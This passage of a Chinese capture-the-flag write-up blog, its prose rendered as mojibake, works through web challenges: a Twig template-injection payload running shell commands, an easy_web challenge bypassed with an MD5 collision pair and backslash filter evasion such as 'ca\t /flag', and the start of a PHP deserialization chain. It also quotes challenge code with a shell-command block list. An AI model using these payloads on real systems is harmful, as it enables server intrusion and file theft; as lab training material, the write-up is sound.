<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts">?<span class="hljs-attr">num</span><span class="hljs-operator">=</span><span class="hljs-number">3e4</span><span class="hljs-variable">&amp;md5</span>=<span class="hljs-number">0e215962017</span><span class="hljs-variable">&amp;get_flag</span>=ls<br><span class="hljs-comment">//404.html fAke_f1agggg.php fl4g.php fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag img.jpg index.php robots.txt </span><br>?<span class="hljs-attr">num</span><span class="hljs-operator">=</span><span class="hljs-number">3e4</span><span class="hljs-variable">&amp;md5</span>=<span class="hljs-number">0e215962017</span><span class="hljs-variable">&amp;get_flag</span>=tac$<span class="hljs-punctuation">&#123;</span>IFS<span class="hljs-punctuation">&#125;</span>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag<br><span class="hljs-comment">//flag&#123;0a4bf020-4cfd-4519-ac84-0481a8b786a2&#125; </span><br></code></pre></td></tr></table></figure>

<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>è¾“å…¥adminè¯•è¯•<br>å›æ˜¾admin<br>æ‰¾åˆ°æºä»£ç <br><img src="/images/0UOK26JNCRDJ39EQSF.png" srcset="/img/loading.gif" lazyload><br>çœ‹çœ‹èƒ½ä¸èƒ½xä¸€ä¸‹<br><img src="/images/XXRMNSDFETL2IUQW.png" srcset="/img/loading.gif" lazyload><br>è¢«htmlè½¬ä¸ºå®ä½“å­—ç¬¦äº†ï¼Œä¸èƒ½x<br>hintä¸­æœ‰æé†’Why not take a closer look at cookiesï¼Ÿ<br>æŠ“åŒ…çœ‹çœ‹<br>æœ‰ä¸¤ä¸ªåŒ…ï¼Œç¬¬äºŒä¸ªåŒ…cookieä¸­userå¯ä»¥æ”¹å˜é¡µé¢å›æ˜¾<br>é‚£å°±æŠ“åˆ°ç¬¬äºŒä¸ªåŒ…<br>æœ¬é¢˜çš„çŸ¥è¯†ç‚¹æ˜¯åˆ©ç”¨æœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥æ”»å‡»ï¼ŒSSTIé‡Œé¢çš„Twigæ”»å‡»<br>åˆ¤æ–­æ¨¡æ¿æ³¨å…¥ç±»å‹çš„æ–¹æ³•<br><img src="/images/61b42a16c2b405e6ab1ada36470713f1.png" srcset="/img/loading.gif" lazyload><br>è¾“å…¥49,è¿”å›49è¡¨ç¤ºæ˜¯Twigæ¨¡å—<br>è¾“å…¥49,è¿”å›7777777è¡¨ç¤ºæ˜¯jinja2æ¨¡å—<br>åœ¨cookieå¤„è¿›è¡Œåˆ¤æ–­<br>user&#x3D;49,æŸ¥çœ‹è¿”å›å€¼<br><img src="/images/B08XOX2WGAPXVUVF5.png" srcset="/img/loading.gif" lazyload><br>åˆ¤æ–­ä¸ºTwigæ³¨å…¥<br>ç”±äºæ˜¯Twigæ³¨å…¥ï¼Œæ‰€ä»¥æœ‰å›½å®šçš„payload</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;id&quot;</span>)&#125;&#125;</span><span class="language-xml">//æŸ¥çœ‹id</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;cat /flag&quot;</span>)&#125;&#125;</span><span class="language-xml">//æŸ¥çœ‹flag</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/AZJKHF8MYLVSXY26LX.png" srcset="/img/loading.gif" lazyload><br><img src="/images/JCTE5HBQ6IX0LVB42K.png" srcset="/img/loading.gif" lazyload><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10056#toc-16">Twigæ¨¡æ¿æ³¨å…¥ä»é›¶åˆ°ä¸€</a></p>
<h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>urlæœ‰ç‚¹å¥‡æ€ª<br><img src="/images/O7TO6JUWTEDZZKGNI8.png" srcset="/img/loading.gif" lazyload><br>cmdéšä¾¿è¾“å…¥123<br>æœ‰å›æ˜¾ï¼Œæ‰§è¡Œä¸€ä¸‹å‘½ä»¤<br>echo%201ï¼Œforbid ~<br>è¢«ç¦æ­¢äº†<br>å†çœ‹imgï¼Œæœ‰ç‚¹åƒbase64ç¼–ç è¿‡çš„ï¼Œbase64è§£ç ä¸€ä¸‹<br><img src="/images/WHMHWO5NM9TXT02WL.png" srcset="/img/loading.gif" lazyload><br>æ›´åƒbase64ç¼–ç è¿‡çš„äº†<br>å†æ¥ä¸€ä¸‹<br><img src="/images/SCSFCWCUQ0RRMHNUTV.png" srcset="/img/loading.gif" lazyload><br>16è¿›åˆ¶è§£ç è¯•è¯•<br><img src="/images/GSFC2R2VJOYPWHQ8WJR.png" srcset="/img/loading.gif" lazyload><br>è·¯å­éƒ½çŸ¥é“äº†<br>åœ¨imgé‡Œä¸Šä¼ ä¸€ä¸ªindex.phpè¯•è¯•<br>åŒæ ·çš„æ–¹æ³•å†ç¼–ç </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php<br><span class="hljs-regexp">//</span>to HEX<br><span class="hljs-number">696</span>e6465782e706870<br><span class="hljs-regexp">//</span>to Base64<br>Njk2ZTY0NjU3ODJlNzA2ODcw<br><span class="hljs-regexp">//</span>to Base64<br>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3<br></code></pre></td></tr></table></figure>

<p><img src="/images/W79NAB1O0JIUAANS4SU5O.png" srcset="/img/loading.gif" lazyload><br><a target="_blank" rel="noopener" href="https://www.lddgo.net/convert/base64-to-image">base64ç¼–ç è½¬å›¾ç‰‡</a><br>ä¸‹è½½ä¸‹æ¥åç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œphpæºç å°±æ‰¾å‡ºæ¥äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixiï½ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>é‡ç‚¹æ˜¯ä¸‹é¢çš„ä»£ç </p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|<span class="hljs-subst">\&#x27;</span>|<span class="hljs-subst">\&quot;</span>|\`|;|,|\*|\?|<span class="hljs-subst">\\</span>|<span class="hljs-subst">\\</span><span class="hljs-subst">\\</span>|<span class="hljs-subst">\n</span>|<span class="hljs-subst">\t</span>|<span class="hljs-subst">\r</span>|\xA0|\&#123;|\&#125;|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\)</span>|\&amp;[^\d]|@|\||<span class="hljs-subst">\\</span>$|\[|\]|&#123;|&#125;|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\)</span>|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    echo(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    echo <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((string)<span class="hljs-variable">$_POST</span>[&#x27;a&#x27;] <span class="hljs-operator">!==</span> (string)<span class="hljs-variable">$_POST</span>[&#x27;b&#x27;] <span class="hljs-operator">&amp;&amp;</span> md5(<span class="hljs-variable">$_POST</span>[&#x27;a&#x27;]) <span class="hljs-operator">===</span> md5(<span class="hljs-variable">$_POST</span>[&#x27;b&#x27;])) &#123;<br>        echo `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        echo (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>ä¸‹é¢çš„MD5å¯ä»¥ç”¨MD5å¼ºç¢°æ’æ¥ç»•è¿‡</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>&amp;b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure>
<p>åå¼•å·ä¸ºsystem<br>ls&amp;catè¢«ç¦ç”¨ï¼Ÿ<br>æ²¡å…³ç³»<br>åæ–œæ ç»•è¿‡</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>l\s<br><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>l\s%<span class="hljs-number">20</span>/<br><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>ca\t%<span class="hljs-number">20</span>/flag<br></code></pre></td></tr></table></figure>

<p>å¼ºç¢°æ’ä¸å»ºè®®ç”¨hackbarï¼Œç”¨burp</p>
<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>å…ˆä¸Šæºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure>

<p>ä¸€å…±ä¸‰ä¸ªç±»</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">Modifier<br><span class="hljs-keyword">Show</span><br><span class="hljs-keyword">Test</span><br></code></pre></td></tr></table></figure>

<p>å…ˆåˆ†æModifierç±»</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>å®šä¹‰ä¸€ä¸ªappendå‡½æ•°<br>æœ‰ä¸ªincludeï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¼ªåè®®æ¥è·å¾—flag.phpçš„å†…å®¹ï¼Œè€Œincludeéœ€è¦__invokeæ–¹æ³•æ¥è°ƒç”¨ï¼Œ__invokeè§¦å‘æ–¹æ³•ä¸ºï¼šå½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œæ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚ã€‚</p>
<p>å†æ¥åˆ†æShowç±»</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
